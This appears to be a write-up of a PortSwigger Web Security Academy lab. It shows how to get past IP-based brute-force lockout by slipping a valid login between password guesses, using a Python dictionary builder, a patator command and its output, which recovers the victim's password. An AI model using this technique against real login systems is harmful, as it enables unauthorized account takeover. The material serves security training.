# Lab 4: Broken brute-force protection, IP block

## Description

This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

-   Your credentials: `wiener:peter`
-   Victim's username: `carlos`
-   [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## Solution

The challenge has a logic flaw in its password brute-force protection mechanism that makes it vulnerable to brute-forcing passwords. Given a valid set of credentials `wiener:peter`, determine the password to the account with the username `carlos`.

Navigate to the login page and intercept a login request using BurpSuite to understand its structure.

```http
POST /login HTTP/1.1
Host: ac961f5f1e7ca5598048a6e500ea007d.web-security-academy.net
Cookie: session=KtD0SoPOuQ3DMMXQuZo9OITnqqE8xdZV
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://ac961f5f1e7ca5598048a6e500ea007d.web-security-academy.net
Dnt: 1
Referer: https://ac961f5f1e7ca5598048a6e500ea007d.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

username=wiener&password=peter
```

The next step is to understand the password brute-force protection mechanism that is in play by answering the following questions:

- After how many failed login attempts does the brute-force protection mechanism kick in and block the IP address?
- Does the mechanism reset an IP address's count if it logs in successfully?
- How does the application determine which IP address to block? Does it go to the actual source IP address first or does it first check the `X-Forwarded-For` HTTP header?

### How Many Failed Logins until Lockout?

Using BurpSuite interceptor, attempt 20 iterative logins and determine after which attempt the IP address was blocked. Use the first 20 passwords from the word list, just in case one is correct.

After 3 failed login attempts, the web application began returning an error indicating too many requests have been made and to try again **in one minute**.

![[Pasted image 20210807204402.png]]


### Does a Successful Login Reset the Count?

Using BurpSuite interceptor, attempt 4 iterative logins. On the 3rd login attempt, use valid credentials. If the 4th request does not indicate IP address blocking, then a successful login does reset the count.

After executing the attack, the 4th request does not indicate IP address blocking.

![[Pasted image 20210807205136.png]]

This indicates that the web application resets an IP address's number of failed login attempts whenever it logs in successfully. By interspersing the credentials `wiener:peter` every two entries in the username:password dictionary, the brute-force protection mechanism can be bypassed.

Build the dictionary.

```python
valid_credentials = "wiener:peter"
username = "carlos"
with open("passwords.txt") as passwords:
    with open("credentials.txt", "w") as credentials:
        credentials.write(valid_credentials + "\n")
        for i, password in enumerate(passwords):
            if (i + 1) % 3 == 0:
                credentials.write(valid_credentials + "\n")
            else:
                credentials.write(f"{username}:{password}")
```

Based on successfully logging in with the credentials `wiener:peter`, the indicator of a successful login is a 302 code. The indicator of a failed login is a 200 code, so ignore those. Ensure the brute-force only happens in a single thread so the counter reset can happen properly.

```bash
$ patator http_fuzz url=https://ac3f1ffb1ef3088d80a304de007f005a.web-security-academy.net/login method=POST body='username=COMBO00&password=COMBO01' 0=credentials.txt -t 1 -x ignore:code=200

21:42:26 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-08-07 21:42 CDT
21:42:26 patator    INFO -                                                                              
21:42:26 patator    INFO - code size:clen       time | candidate                          |   num | mesg
21:42:26 patator    INFO - -----------------------------------------------------------------------------
21:42:27 patator    INFO - 302  170:0          0.131 | wiener:peter                       |     1 | HTTP/1.1 302 Found
21:42:29 patator    INFO - 302  170:0          0.121 | wiener:peter                       |     4 | HTTP/1.1 302 Found
21:42:30 patator    INFO - 302  170:0          0.126 | wiener:peter                       |     7 | HTTP/1.1 302 Found
21:42:32 patator    INFO - 302  170:0          0.127 | wiener:peter                       |    10 | HTTP/1.1 302 Found
21:42:34 patator    INFO - 302  170:0          0.119 | wiener:peter                       |    13 | HTTP/1.1 302 Found
21:42:35 patator    INFO - 302  170:0          0.125 | wiener:peter                       |    16 | HTTP/1.1 302 Found
21:42:37 patator    INFO - 302  170:0          0.129 | wiener:peter                       |    19 | HTTP/1.1 302 Found
21:42:39 patator    INFO - 302  170:0          0.127 | wiener:peter                       |    22 | HTTP/1.1 302 Found
21:42:40 patator    INFO - 302  170:0          0.128 | wiener:peter                       |    25 | HTTP/1.1 302 Found
21:42:42 patator    INFO - 302  170:0          0.130 | wiener:peter                       |    28 | HTTP/1.1 302 Found
21:42:44 patator    INFO - 302  170:0          0.129 | wiener:peter                       |    31 | HTTP/1.1 302 Found
21:42:45 patator    INFO - 302  170:0          0.131 | wiener:peter                       |    34 | HTTP/1.1 302 Found
21:42:47 patator    INFO - 302  170:0          0.133 | wiener:peter                       |    37 | HTTP/1.1 302 Found
21:42:48 patator    INFO - 302  170:0          0.126 | wiener:peter                       |    40 | HTTP/1.1 302 Found
21:42:50 patator    INFO - 302  170:0          0.127 | wiener:peter                       |    43 | HTTP/1.1 302 Found
21:42:52 patator    INFO - 302  170:0          0.130 | wiener:peter                       |    46 | HTTP/1.1 302 Found
21:42:53 patator    INFO - 302  170:0          0.128 | wiener:peter                       |    49 | HTTP/1.1 302 Found
21:42:55 patator    INFO - 302  170:0          0.125 | wiener:peter                       |    52 | HTTP/1.1 302 Found
21:42:57 patator    INFO - 302  170:0          0.122 | wiener:peter                       |    55 | HTTP/1.1 302 Found
21:42:58 patator    INFO - 302  170:0          0.126 | wiener:peter                       |    58 | HTTP/1.1 302 Found
21:43:00 patator    INFO - 302  170:0          0.125 | wiener:peter                       |    61 | HTTP/1.1 302 Found
21:43:01 patator    INFO - 302  170:0          0.126 | carlos:jessica                     |    62 | HTTP/1.1 302 Found
21:43:02 patator    INFO - 302  170:0          0.159 | wiener:peter                       |    64 | HTTP/1.1 302 Found
21:43:03 patator    INFO - 302  170:0          0.129 | wiener:peter                       |    67 | HTTP/1.1 302 Found
21:43:05 patator    INFO - 302  170:0          0.131 | wiener:peter                       |    70 | HTTP/1.1 302 Found
21:43:07 patator    INFO - 302  170:0          0.132 | wiener:peter                       |    73 | HTTP/1.1 302 Found
21:43:09 patator    INFO - 302  170:0          0.124 | wiener:peter                       |    76 | HTTP/1.1 302 Found
21:43:11 patator    INFO - 302  170:0          0.126 | wiener:peter                       |    79 | HTTP/1.1 302 Found
21:43:12 patator    INFO - 302  170:0          0.127 | wiener:peter                       |    82 | HTTP/1.1 302 Found
21:43:14 patator    INFO - 302  170:0          0.123 | wiener:peter                       |    85 | HTTP/1.1 302 Found
21:43:16 patator    INFO - 302  170:0          0.125 | wiener:peter                       |    88 | HTTP/1.1 302 Found
21:43:18 patator    INFO - 302  170:0          0.128 | wiener:peter                       |    91 | HTTP/1.1 302 Found
21:43:19 patator    INFO - 302  170:0          0.126 | wiener:peter                       |    94 | HTTP/1.1 302 Found
21:43:21 patator    INFO - 302  170:0          0.129 | wiener:peter                       |    97 | HTTP/1.1 302 Found
21:43:22 patator    INFO - 302  170:0          0.126 | wiener:peter                       |   100 | HTTP/1.1 302 Found
21:43:23 patator    INFO - Hits/Done/Skip/Fail/Size: 35/101/0/0/101, Avg: 1 r/s, Time: 0h 0m 57s
```

The only successful login with the username  `carlos` is the password `jessica`.
